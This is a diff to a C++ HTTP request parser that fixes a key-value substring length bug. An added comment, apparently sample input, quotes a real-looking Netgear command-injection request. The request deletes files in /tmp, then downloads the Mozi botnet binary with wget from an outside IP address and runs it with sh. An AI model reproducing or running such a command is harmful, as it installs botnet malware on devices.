@@ -82,7 +82,8 @@ const HttpParser::HttpRquestMap &HttpParser::ParserRequest(const String8& httpRe
     return mHttpRequestMap;
 }
 
-// username=xxxx&password=xxxx
+// next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;
+// wget+http://61.54.223.119:48782/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 bool HttpParser::ParserRequestData()
 {
     if (mRequestData.size() == 0) {
@@ -93,10 +94,10 @@ bool HttpParser::ParserRequestData()
     String8 requestData = (const char *)mRequestData.const_data();
 
     while ((pos = requestData.find('&', prevPos)) > 0) {
-        String8 keyValue = String8(requestData.c_str() + prevPos, pos);
+        String8 keyValue = String8(requestData.c_str() + prevPos, pos - prevPos);
         LOGD("%s() KeyValue = \"%s\"", __func__, keyValue.c_str());
         int32_t equalPos = keyValue.find('=');
-        if (equalPos > 0) { // username=eular
+        if (equalPos > 0) {
             mRequestDataMap[String8(keyValue.c_str(), equalPos)] = String8(keyValue.c_str() + equalPos + 1);
         }
         prevPos = pos + 1;
